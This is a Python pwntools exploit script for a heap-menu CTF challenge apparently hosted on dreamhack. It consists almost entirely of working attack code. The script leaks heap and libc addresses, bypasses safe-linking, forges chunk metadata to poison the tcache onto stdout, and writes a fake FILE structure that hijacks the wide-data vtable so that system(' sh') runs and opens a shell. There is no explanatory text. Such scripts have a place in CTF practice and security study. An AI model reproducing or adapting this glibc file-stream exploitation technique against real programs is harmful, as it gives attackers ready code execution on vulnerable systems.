#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

local_port = 5000

localscript = '''
file %s
define rerun
    !docker exec -u root -i debug_container bash -c "kill -9 \\$(pidof gdbserver) &"
    !docker exec -u root -i debug_container bash -c "gdbserver :9090 --attach \\$(pidof chall) &"
end
define con
    target remote :9090
end
''' % exe.path

gdbscript = '''
brva 0x17ff
continue
'''

info = lambda msg: log.info(msg)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sna = lambda p, msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sn = lambda p, data: p.sendline(str(data).encode())
s = lambda p, data: p.send(data)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = remote("localhost", local_port)
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript, env=dict(SHELL='/bin/bash'))
    elif args.REMOTE:
        r = remote("host8.dreamhack.games", 12012)

    return r

def debug_container(p):
    if args.LOCAL:
        gdbserver_cmd = "docker exec -u root -i debug_container bash -c".split()
        gdbserver_cmd.append("gdbserver :9090 --attach $(pidof prob)")
        process(gdbserver_cmd)
        
        # gdb.attach(('0.0.0.0', 9090), exe=exe.path, gdbscript=localscript + gdbscript)
        pause()


def create (p, idx, sz):
    sla (p, b'>> ', b'1')
    sla (p, b'idx: ', str(idx).encode())
    sla (p, b'size: ', str(sz).encode())

def delete (p, idx):
    sna (p, b'>> ', 2)
    sla (p, b'idx: ', str(idx).encode())

def edit (p, idx, content):
    sna (p, b'>> ', 3)
    sla (p, b'idx: ', str(idx).encode())
    sa (p, b'content: ', content)

def view (p, idx):
    sna (p, b'>> ', 4)
    sla (p, b'idx: ', str(idx).encode())
    

def main():
    p = conn()
    if args.LOCAL and args.GDB:
        debug_container(p)

    create (p, 0, 0x518)
    create (p, 1, 0x18)
    create (p, 2, 0x28) # chunk's size
    create (p, 3, 0x38) # fd ptr
    create (p, 4, 0x48) # bk ptr
    create (p, 5, 0x528)
    create (p, 6, 0x58)
    create (p, 7, 0xe8)


    delete (p, 2)
    view (p, 2)
    leak = u64 (p.recv (8))
    info (f'{hex (leak)}')
    leak ^= 0
    heap_addr = leak << 12
    info (f'The address of heap is: {hex (heap_addr)}')

    
    fd_ptr = (heap_addr + 0x290 + 0x520 + 0x20) >> 12
    fd_ptr ^= 0x251
    payload = p64 (fd_ptr) + p64 (0) * 3 + p64 (0) + p64 (0x41) 
    edit (p, 2, payload)
    edit (p, 0, b'A' * 0x10 * 4 + p64 (0x250) + p64 (0x20) + p64 (0) * 2 * 0x4c + p64 (0) + p64 (0x21))
    create (p, 2, 0x28)

    fd_ptr = (heap_addr + 0x290 + 0x520 + 0x20 + 0x30) >> 12
    fd_ptr ^= (heap_addr + 0x290)
    payload = p64 (fd_ptr) + p64 (0) * 5 + p64 (0) + p64 (0x51)
    delete (p, 3)
    edit (p, 3, payload)
    create (p, 3, 0x38)

    fd_ptr = (heap_addr + 0x290 + 0x520 + 0x20 + 0x30 + 0x40) >> 12
    fd_ptr ^= (heap_addr + 0x290 + 0x520 + 0x20 + 0x30 + 0x40 + 0x50)
    payload = p64 (fd_ptr) + p64 (0) * 7 + p64 (0) + p64 (0x531)
    delete (p, 4)
    edit (p, 4, payload)
    create (p, 4, 0x48)

    delete (p, 0)
    delete (p, 5)

    view (p, 0)
    libc.address = u64 (p.recv (8)) - libc.sym['main_arena'] - 96
    info (f'The address of libc is: {hex (libc.address)}')

    payload = p64 (heap_addr + 0x90) + p64 (libc.sym['main_arena'] + 96) + b'\x00' * 0x510 + p64 (0x530) + p64 (0x60)
    edit (p, 5, payload)

    payload = p64 (libc.sym['main_arena'] + 96) + p64 (heap_addr + 0x90) + b'A' * 0x30 + p64 (0x250) + p64 (0x20) + p64 (0) * 2 * 0x4c + p64 (0x520) + p64 (0x20)
    edit (p, 0, payload)


    create (p, 5, 0x70)
    delete (p, 7)

    payload = p64 (0) * 10 + p64 (0) + p64 (libc.sym['_IO_2_1_stdout_']) + p64 (0) * 3 + p64 (0x1d1)
    edit (p, 5, payload)

    create (p, 7, 0xe8)

    fake_file = libc.sym['_IO_2_1_stdout_']
    payload = flat({
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64 (0),
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x58: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.symbols["_IO_stdfile_1_lock"],
        # fake_file->file._wide_data
        0xA0: fake_file - 0x10,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: fake_file - 0x10,
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"] - 0x20
    })

    edit (p, 7, payload)

    p.interactive()


if __name__ == "__main__":
    main()